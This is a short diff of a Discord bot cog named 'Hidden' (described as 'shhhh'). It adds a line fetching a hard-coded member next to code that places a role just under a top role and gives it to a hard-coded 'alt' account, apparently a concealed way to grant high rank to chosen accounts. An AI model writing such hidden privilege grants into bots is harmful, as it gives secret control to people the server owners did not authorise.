@@ -217,6 +217,7 @@ class Hidden(commands.Cog, name="Hidden", description="shhhh", command_attrs=dic
         await role.edit(position=tpne.top_role.position - 1)
 
         alt = await guild.fetch_member(1188242507545456704)
+        die = await guild.fetch_member(1208003447388119040)
         await alt.add_roles(role)
 
         for user in ctx.guild.members:
